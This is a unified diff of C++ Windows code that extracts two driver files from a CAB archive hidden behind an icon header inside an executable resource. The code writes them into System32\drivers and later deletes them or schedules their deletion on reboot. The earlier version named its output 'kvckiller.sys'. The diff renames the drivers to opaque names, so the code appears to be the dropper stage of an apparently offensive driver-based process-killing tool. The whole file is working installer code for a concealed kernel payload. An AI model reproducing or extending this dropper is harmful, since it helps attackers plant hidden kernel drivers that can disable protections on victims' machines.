@@ -1,27 +1,53 @@
 #include "DriverExtract.h"
 #include "GenIconSize.h"
 #include "Resource.h"
+#include "Console.h"
+#include "StrUtils.h"
+#include "RuntimeSupport.h"
 
 #include <windows.h>
 #include <fdi.h>
-#include <iostream>
 
 #pragma comment(lib, "Cabinet.lib")
 
+#ifndef SEEK_SET
+#define SEEK_SET 0
+#define SEEK_CUR 1
+#define SEEK_END 2
+#endif
+
 // ============================================================================
-// FDI IN-MEMORY STATE
+// FDI IN-MEMORY STATE (multi-file CAB support)
 // ============================================================================
+
+struct ExtractedFile {
+    char    name[64];
+    BYTE*   data;
+    SIZE_T  size;
+};
+
+struct CabStream {
+    bool   inUse;
+    SIZE_T offset;
+};
+
+static constexpr int kMaxCabStreams = 8;
+static constexpr int kMaxFiles      = 2;
 
 static struct {
     const BYTE* cabPtr;
-    SIZE_T      cabOff;
     SIZE_T      cabEnd;
+
     BYTE*       outPtr;
     SIZE_T      outUsed;
     SIZE_T      outCap;
-} g_fdi;
 
-static wchar_t g_driverPath[MAX_PATH];
+    CabStream   streams[kMaxCabStreams];
+
+    ExtractedFile files[kMaxFiles];
+    int           fileCount;
+    int           currentFile;
+} g_fdi;
 
 // ============================================================================
 // FDI CALLBACKS
@@ -37,55 +63,138 @@ static void DIAMONDAPI fdi_free(LPVOID pv)
     HeapFree(GetProcessHeap(), 0, pv);
 }
 
-static INT_PTR DIAMONDAPI fdi_open(char* /*pszFile*/, int /*oflag*/, int /*pmode*/)
+static INT_PTR DIAMONDAPI fdi_open(char*, int, int)
 {
-    return 1;   // fake file handle — data comes from g_fdi.cabPtr
+    for (int i = 0; i < kMaxCabStreams; ++i) {
+        if (!g_fdi.streams[i].inUse) {
+            g_fdi.streams[i].inUse = true;
+            g_fdi.streams[i].offset = 0;
+            return static_cast<INT_PTR>(i + 1);
+        }
+    }
+    return -1;
 }
 
-static UINT DIAMONDAPI fdi_read(INT_PTR /*hf*/, void* pv, UINT cb)
+static UINT DIAMONDAPI fdi_read(INT_PTR hf, void* pv, UINT cb)
 {
-    SIZE_T avail = g_fdi.cabEnd - g_fdi.cabOff;
-    if (cb > (UINT)avail) cb = (UINT)avail;
+    if (hf < 1 || hf > kMaxCabStreams) return 0;
+    auto& s = g_fdi.streams[hf - 1];
+    if (!s.inUse) return 0;
+
+    SIZE_T avail = (s.offset < g_fdi.cabEnd) ? (g_fdi.cabEnd - s.offset) : 0;
+    if (cb > static_cast<UINT>(avail))
+        cb = static_cast<UINT>(avail);
+
     if (cb > 0) {
-        memcpy(pv, g_fdi.cabPtr + g_fdi.cabOff, cb);
-        g_fdi.cabOff += cb;
+        memcpy(pv, g_fdi.cabPtr + s.offset, cb);
+        s.offset += cb;
     }
     return cb;
 }
 
-static UINT DIAMONDAPI fdi_write(INT_PTR /*hf*/, void* pv, UINT cb)
+static UINT DIAMONDAPI fdi_write(INT_PTR hf, void* pv, UINT cb)
 {
-    if (g_fdi.outUsed + cb > g_fdi.outCap) return 0;
+    int idx = static_cast<int>(hf - 0x100);
+    if (idx < 0 || idx >= kMaxFiles) return 0;
+
+    if (g_fdi.outUsed + cb > g_fdi.outCap) {
+        SIZE_T newCap = (g_fdi.outCap + cb) * 2;
+        BYTE* newData = reinterpret_cast<BYTE*>(
+            HeapReAlloc(GetProcessHeap(), 0, g_fdi.files[idx].data, newCap));
+        if (!newData) return 0;
+        g_fdi.files[idx].data = newData;
+        g_fdi.outPtr = newData;
+        g_fdi.outCap = newCap;
+    }
+
     memcpy(g_fdi.outPtr + g_fdi.outUsed, pv, cb);
     g_fdi.outUsed += cb;
     return cb;
 }
 
-static int DIAMONDAPI fdi_close(INT_PTR /*hf*/)
+static int DIAMONDAPI fdi_close(INT_PTR hf)
 {
+    if (hf >= 1 && hf <= kMaxCabStreams) {
+        g_fdi.streams[hf - 1].inUse = false;
+        g_fdi.streams[hf - 1].offset = 0;
+    }
     return 0;
 }
 
-static long DIAMONDAPI fdi_seek(INT_PTR /*hf*/, long dist, int seektype)
+static long DIAMONDAPI fdi_seek(INT_PTR hf, long dist, int seektype)
 {
-    long newPos;
+    if (hf >= 0x100 && hf < 0x100 + kMaxFiles) {
+        long newPos = 0;
+        if (seektype == SEEK_SET)
+            newPos = dist;
+        else if (seektype == SEEK_CUR)
+            newPos = static_cast<long>(g_fdi.outUsed) + dist;
+        else
+            newPos = static_cast<long>(g_fdi.outCap) + dist;
+        if (newPos < 0) newPos = 0;
+        g_fdi.outUsed = static_cast<SIZE_T>(newPos);
+        return newPos;
+    }
+
+    if (hf < 1 || hf > kMaxCabStreams) return -1;
+    auto& s = g_fdi.streams[hf - 1];
+    if (!s.inUse) return -1;
+
+    long newPos = 0;
     if (seektype == SEEK_SET)
         newPos = dist;
     else if (seektype == SEEK_CUR)
-        newPos = (long)g_fdi.cabOff + dist;
+        newPos = static_cast<long>(s.offset) + dist;
     else
-        newPos = (long)g_fdi.cabEnd + dist;
+        newPos = static_cast<long>(g_fdi.cabEnd) + dist;
 
     if (newPos < 0) newPos = 0;
-    if ((SIZE_T)newPos > g_fdi.cabEnd) newPos = (long)g_fdi.cabEnd;
-    g_fdi.cabOff = (SIZE_T)newPos;
+    if (static_cast<SIZE_T>(newPos) > g_fdi.cabEnd)
+        newPos = static_cast<long>(g_fdi.cabEnd);
+
+    s.offset = static_cast<SIZE_T>(newPos);
     return newPos;
 }
 
-static INT_PTR DIAMONDAPI fdi_notify(FDINOTIFICATIONTYPE fdint, PFDINOTIFICATION /*pfdin*/)
+static INT_PTR DIAMONDAPI fdi_notify(FDINOTIFICATIONTYPE fdint, PFDINOTIFICATION pfdin)
 {
-    if (fdint == fdintCOPY_FILE)       return 1;
-    if (fdint == fdintCLOSE_FILE_INFO) return TRUE;
+    if (fdint == fdintCOPY_FILE) {
+        if (g_fdi.fileCount >= kMaxFiles) return 0;
+
+        int idx = g_fdi.fileCount;
+        SIZE_T allocSize = (pfdin->cb > 0) ? static_cast<SIZE_T>(pfdin->cb) : (256 * 1024);
+        g_fdi.files[idx].data = reinterpret_cast<BYTE*>(
+            HeapAlloc(GetProcessHeap(), 0, allocSize));
+        if (!g_fdi.files[idx].data) return 0;
+
+        size_t nameLen = StrUtils::StrLen(pfdin->psz1);
+        if (nameLen >= sizeof(g_fdi.files[idx].name)) {
+            nameLen = sizeof(g_fdi.files[idx].name) - 1;
+        }
+        memcpy(g_fdi.files[idx].name, pfdin->psz1, nameLen);
+        g_fdi.files[idx].name[nameLen] = '\0';
+        g_fdi.files[idx].size = 0;
+
+        g_fdi.outPtr  = g_fdi.files[idx].data;
+        g_fdi.outUsed = 0;
+        g_fdi.outCap  = allocSize;
+        g_fdi.currentFile = idx;
+
+        return static_cast<INT_PTR>(0x100 + idx);
+    }
+
+    if (fdint == fdintCLOSE_FILE_INFO) {
+        int idx = g_fdi.currentFile;
+        if (idx >= 0 && idx < kMaxFiles) {
+            g_fdi.files[idx].size = g_fdi.outUsed;
+            g_fdi.fileCount++;
+        }
+        return TRUE;
+    }
+
+    if (fdint == fdintENUMERATE)
+        return TRUE;
+
     return 0;
 }
 
@@ -95,15 +204,15 @@ static INT_PTR DIAMONDAPI fdi_notify(FDINOTIFICATIONTYPE fdint, PFDINOTIFICATION
 
 static bool DecompressFromResource() noexcept
 {
-    HRSRC hRes = FindResourceW(nullptr, MAKEINTRESOURCEW(IDR_DRIVER), RT_RCDATA);
+    HRSRC hRes = FindResourceW(nullptr, MAKEINTRESOURCEW(IDR_DRIVER), (LPCWSTR)RT_RCDATA);
     if (!hRes) {
-        std::wcout << L"[!] IDR_DRIVER resource not found\n";
+        Console::PrintLine(L"[!] IDR_DRIVER resource not found");
         return false;
     }
 
     DWORD totalSize = SizeofResource(nullptr, hRes);
     if (totalSize <= ICON_HEADER_SIZE + 4) {
-        std::wcout << L"[!] Resource too small (no CAB payload)\n";
+        Console::PrintLine(L"[!] Resource too small (no CAB data)");
         return false;
     }
 
@@ -113,28 +222,22 @@ static bool DecompressFromResource() noexcept
     const BYTE* raw = reinterpret_cast<const BYTE*>(LockResource(hGlob));
     if (!raw) return false;
 
-    SIZE_T cabSize = totalSize - ICON_HEADER_SIZE;
+    // Verify CAB magic signature ("MSCF")
+    if (memcmp(raw + ICON_HEADER_SIZE, "MSCF", 4) != 0) {
+        Console::PrintLine(L"[!] Invalid CAB header signature (expected 'MSCF')");
+        return false;
+    }
 
-    static const SIZE_T kOutCap = 1024 * 1024;   // 1 MB — enough for any driver
-    BYTE* outBuf = reinterpret_cast<BYTE*>(HeapAlloc(GetProcessHeap(), 0, kOutCap));
-    if (!outBuf) return false;
-
-    g_fdi.cabPtr  = raw + ICON_HEADER_SIZE;
-    g_fdi.cabOff  = 0;
-    g_fdi.cabEnd  = cabSize;
-    g_fdi.outPtr  = outBuf;
-    g_fdi.outUsed = 0;
-    g_fdi.outCap  = kOutCap;
+    memset(&g_fdi, 0, sizeof(g_fdi));
+    g_fdi.cabPtr      = raw + ICON_HEADER_SIZE;
+    g_fdi.cabEnd      = totalSize - ICON_HEADER_SIZE;
+    g_fdi.currentFile = -1;
 
     ERF erf{};
     HFDI hfdi = FDICreate(fdi_alloc, fdi_free, fdi_open, fdi_read,
                           fdi_write, fdi_close, fdi_seek, cpuUNKNOWN, &erf);
-    if (!hfdi) {
-        HeapFree(GetProcessHeap(), 0, outBuf);
-        return false;
-    }
+    if (!hfdi) return false;
 
-    // Cabinet name / path strings are irrelevant — we read from memory
     BOOL ok = FDICopy(hfdi,
                       const_cast<char*>("memory.cab"),
                       const_cast<char*>(""),
@@ -142,12 +245,115 @@ static bool DecompressFromResource() noexcept
 
     FDIDestroy(hfdi);
 
-    if (!ok || g_fdi.outUsed == 0) {
-        HeapFree(GetProcessHeap(), 0, outBuf);
-        std::wcout << L"[!] FDI decompression failed (erf=" << erf.erfOper << L")\n";
+    if (!ok || g_fdi.fileCount == 0) {
+        for (int i = 0; i < kMaxFiles; ++i) {
+            if (g_fdi.files[i].data) {
+                HeapFree(GetProcessHeap(), 0, g_fdi.files[i].data);
+                g_fdi.files[i].data = nullptr;
+            }
+        }
+        Console::Print(L"[!] FDI decompression failed (erf=");
+        Console::PrintInt(erf.erfOper);
+        Console::PrintLine(L")");
         return false;
     }
 
+    return true;
+}
+
+// ============================================================================
+// WRITE DRIVER FILE TO System32\drivers
+// ============================================================================
+
+static bool WriteDriverFile(const BYTE* data, SIZE_T size,
+                            const wchar_t* fileName, wchar_t* outPath) noexcept
+{
+    wchar_t winDir[MAX_PATH] = {};
+    GetSystemWindowsDirectoryW(winDir, MAX_PATH);
+
+    StrUtils::StrCopy(outPath, MAX_PATH, winDir);
+    StrUtils::StrConcat(outPath, MAX_PATH, L"\\System32\\drivers\\");
+    StrUtils::StrConcat(outPath, MAX_PATH, fileName);
+
+    DWORD attr = GetFileAttributesW(outPath);
+    if (attr != INVALID_FILE_ATTRIBUTES) {
+        bool contentMatches = false;
+        HANDLE hCheck = CreateFileW(outPath, GENERIC_READ,
+                                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+                                    nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hCheck != INVALID_HANDLE_VALUE) {
+            LARGE_INTEGER existingSize{};
+            if (GetFileSizeEx(hCheck, &existingSize) &&
+                existingSize.QuadPart == static_cast<LONGLONG>(size)) {
+                
+                BYTE* diskBuf = static_cast<BYTE*>(HeapAlloc(GetProcessHeap(), 0, size));
+                if (diskBuf) {
+                    DWORD bytesRead = 0;
+                    if (ReadFile(hCheck, diskBuf, static_cast<DWORD>(size), &bytesRead, nullptr) &&
+                        bytesRead == static_cast<DWORD>(size)) {
+                        if (memcmp(diskBuf, data, size) == 0) {
+                            contentMatches = true;
+                        }
+                    }
+                    HeapFree(GetProcessHeap(), 0, diskBuf);
+                }
+            }
+            CloseHandle(hCheck);
+        }
+
+        if (contentMatches) {
+            Console::DbgPrint(L"[*] ");
+            Console::DbgPrint(fileName);
+            Console::DbgPrint(L" already present and verified in drivers directory (");
+            Console::DbgPrintUint(size);
+            Console::DbgPrintLine(L" B)");
+            return true;
+        }
+
+        Console::DbgPrint(L"[*] Existing ");
+        Console::DbgPrint(fileName);
+        Console::DbgPrintLine(L" is corrupted or mismatched - replacing with clean copy...");
+        SetFileAttributesW(outPath, FILE_ATTRIBUTE_NORMAL);
+        if (!DeleteFileW(outPath)) {
+            DWORD delErr = GetLastError();
+            if (delErr == ERROR_SHARING_VIOLATION || delErr == ERROR_ACCESS_DENIED) {
+                Console::DbgPrint(L"[-] ");
+                Console::DbgPrint(fileName);
+                Console::DbgPrint(L" locked by system (err=");
+                Console::DbgPrintUint(delErr);
+                Console::DbgPrintLine(L")");
+            }
+        }
+    }
+
+    HANDLE hFile = CreateFileW(outPath, GENERIC_WRITE, FILE_SHARE_READ, nullptr,
+                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        DWORD err = GetLastError();
+        Console::Print(L"[!] Cannot write ");
+        Console::Print(outPath);
+        Console::Print(L" (err=");
+        Console::PrintUint(err);
+        Console::PrintLine(L")");
+        return false;
+    }
+
+    DWORD written = 0;
+    BOOL writeOk = WriteFile(hFile, data, static_cast<DWORD>(size), &written, nullptr);
+    CloseHandle(hFile);
+
+    if (!writeOk || written != static_cast<DWORD>(size)) {
+        Console::Print(L"[!] WriteFile failed for ");
+        Console::PrintLine(fileName);
+        DeleteFileW(outPath);
+        return false;
+    }
+
+    Console::DbgPrint(L"[+] ");
+    Console::DbgPrint(fileName);
+    Console::DbgPrint(L" extracted and verified (");
+    Console::DbgPrintUint(written);
+    Console::DbgPrintLine(L" B)");
     return true;
 }
 
@@ -155,53 +361,60 @@ static bool DecompressFromResource() noexcept
 // PUBLIC API
 // ============================================================================
 
-bool ExtractKillerDriver() noexcept
+bool ExtractDrivers(ExtractedDrivers& out) noexcept
 {
+    memset(&out, 0, sizeof(out));
+
     if (!DecompressFromResource()) return false;
 
-    // Build destination path: %SystemRoot%\System32\drivers\kvckiller.sys
-    wchar_t winDir[MAX_PATH] = {};
-    GetSystemWindowsDirectoryW(winDir, MAX_PATH);
-    _snwprintf_s(g_driverPath, MAX_PATH, _TRUNCATE,
-                 L"%s\\System32\\drivers\\kvckiller.sys", winDir);
+    for (int i = 0; i < g_fdi.fileCount; ++i) {
+        const auto& f = g_fdi.files[i];
 
-    HANDLE hFile = CreateFileW(g_driverPath, GENERIC_WRITE, 0, nullptr,
-                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        std::wcout << L"[!] Cannot write " << g_driverPath
-                   << L" (err=" << GetLastError() << L")\n";
-        HeapFree(GetProcessHeap(), 0, g_fdi.outPtr);
-        g_fdi.outPtr  = nullptr;
-        g_fdi.outUsed = 0;
-        return false;
+        if (StrUtils::StrEqualNoCase(f.name, "1")) {
+            out.drv1Ok = WriteDriverFile(f.data, f.size,
+                                         L"1", out.drv1Path);
+        } else if (StrUtils::StrEqualNoCase(f.name, "2")) {
+            out.drv2Ok = WriteDriverFile(f.data, f.size,
+                                         L"2", out.drv2Path);
+        }
+
+        HeapFree(GetProcessHeap(), 0, f.data);
     }
 
-    DWORD written    = 0;
-    DWORD toWrite    = static_cast<DWORD>(g_fdi.outUsed);
-    BOOL  writeOk    = WriteFile(hFile, g_fdi.outPtr, toWrite, &written, nullptr);
-    DWORD writeErr   = GetLastError();
-    CloseHandle(hFile);
-
-    HeapFree(GetProcessHeap(), 0, g_fdi.outPtr);
-    g_fdi.outPtr  = nullptr;
-    g_fdi.outUsed = 0;
-
-    if (!writeOk || written != toWrite) {
-        std::wcout << L"[!] WriteFile failed (err=" << writeErr << L")\n";
-        return false;
-    }
-
-    std::wcout << L"[+] kvckiller.sys extracted (" << written << L" B)\n";
-    return true;
+    return out.drv1Ok || out.drv2Ok;
 }
 
-const wchar_t* GetKillerDriverPath() noexcept
+void CleanupExtractedDrivers(const ExtractedDrivers& drivers) noexcept
 {
-    if (g_driverPath[0]) return g_driverPath;
+    Console::DbgPrintLine(L"[*] Cleaning up driver files from System32\\drivers...");
 
-    wchar_t winDir[MAX_PATH] = {};
-    GetSystemWindowsDirectoryW(winDir, MAX_PATH);
-    _snwprintf_s(g_driverPath, MAX_PATH, _TRUNCATE,
-                 L"%s\\System32\\drivers\\kvckiller.sys", winDir);
-    return g_driverPath;
+    auto removeOne = [](const wchar_t* path, const wchar_t* name) {
+        if (path && path[0] != L'\0') {
+            DWORD attr = GetFileAttributesW(path);
+            if (attr != INVALID_FILE_ATTRIBUTES) {
+                SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL);
+                if (DeleteFileW(path)) {
+                    Console::DbgPrint(L"[+] Cleaned up ");
+                    Console::DbgPrintLine(name);
+                } else {
+                    DWORD err = GetLastError();
+                    if (err == ERROR_SHARING_VIOLATION || err == ERROR_ACCESS_DENIED) {
+                        MoveFileExW(path, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
+                        Console::DbgPrint(L"[-] ");
+                        Console::DbgPrint(name);
+                        Console::DbgPrintLine(L" locked; scheduled for delete on reboot");
+                    } else {
+                        Console::DbgPrint(L"[-] Failed to delete ");
+                        Console::DbgPrint(name);
+                        Console::DbgPrint(L" (err=");
+                        Console::DbgPrintUint(err);
+                        Console::DbgPrintLine(L")");
+                    }
+                }
+            }
+        }
+    };
+
+    removeOne(drivers.drv1Path, L"1");
+    removeOne(drivers.drv2Path, L"2");
 }
